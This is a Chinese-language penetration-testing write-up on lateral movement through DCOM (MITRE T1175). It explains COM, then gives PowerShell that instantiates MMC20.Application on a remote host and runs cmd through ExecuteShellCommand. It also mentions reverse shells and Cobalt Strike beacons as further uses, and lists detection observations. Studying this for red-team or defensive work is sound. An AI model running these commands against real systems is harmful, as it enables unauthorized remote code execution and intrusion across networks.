T1175: Lateral Movement via DCOM
查看mitre ATT&CK 的描述，已经不推荐使用该技术，推荐使用Remote Services: Distributed 
Component Object Model和Inter-Process Communication: Component Object Model。
参考：
The Component Object Model
LATERAL MOVEMENT USING EXCEL.APPLICATION AND DCOM
域渗透——利用DCOM在远程系统执行程序
组件对象模型
什么是DCOM（ Distributed Component Object Model ，分布式组件模型）,先说下COM 
（Component Object Model ，组件对象模型）。
COM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式
开发的一种新的软件开发技术。——百科
The Microsoft Component Object Model (COM) is a platform-independent, distributed, 
object-oriented system for creating binary software components that can interact. COM is 
the foundation technology for Microsoft's OLE (compound documents), ActiveX (Internet-
enabled components), as well as others.——MSDN
简要的描述下COM：
COM 不是一种面向对象的语言，而是一种标准，和编程语言或OS无关。
COM对语言的唯一要求：代码在能够创造指针结构的语言中生成，并且能够通过指针显式或隐式
的调用函数。
COM 主要的两个内容：对象和接口
每个对象和接口都关联一个128位的GUID（全局唯一标识符），称为类CLSID（类标识符），用于
标识唯一的COM对象。
COM 类在操作系统中注册的，位于注册表中：
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID
DCOM是什么？ RPC+COM == DCOM ,DCOM允许COM组件利用网络来传输数据。
笔者这里只是简单里描述关键概念，Microsoft 为了实现跨机器、跨语言、跨平台、跨进程，
COM的内容非常之复杂。
对DCOM有了一个了解，下面的测试过程可以概括为：利用DCOM 远程调用COM组件执行命令
Execution
MMC20.Application COM class 存储在注册表中：
和目标建立连接：
通过DCOM对象在受害者系统上执行命令：
仅演示，既然能执行cmd，就能执行其他命令，反弹shell，存活探测等等。
不要局限演示，例如在Cobalt Strike   beacon 中执行命令等等。
Get-ChildItem 'registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-
4C90-9B8E-E860BA07F889}'
$a = 
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.
1","192.168.3.142"))
$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > 
c:\Hostname.txt","7")
Observations
先看下整个执行命令过程发生的日志：
使用ProcessMonitor 查看下进程详情：
mmc.exe 的父进程是 svchost.exe ,在TCP/IP 菜单中可以查看到 PC-jerry-0day 向 OWA2010SP3 建立的
连接。
使用ProcessMonitor 查看 "mmc.exe"启动过程中的调用 stack（堆栈），调用了 rpcrt4.dll :
小结
使用DCOM横向的方法还有很多，文章的原作者写了几篇关于DCOM 横向的，有机会在学习吧，可能
我们用的最多的是 impacket 中的dcomexec ,原理上有所不同，具体哪里不同，笔者也说不上来（如果
有知道的师傅请指教），唯一注意的点，需要管理权限。
参考
View::ExecuteShellCommand method
LATERAL MOVEMENT USING THE MMC20.APPLICATION COM OBJECT
GetTypeFromCLSID(Guid, String)
COM Technical Overview
还有一部分资料没来得及阅读，这里补充：
如何滥用DCOM实现横向渗透
红蓝对抗攻防实战：寻找COM对象
Abusing the COM Registry Structure: CLSID, LocalServer32, & InprocServer32
Abusing DCOM For Yet Another Lateral Movement Technique
NEW LATERAL MOVEMENT TECHNIQUES ABUSE DCOM TECHNOLOGY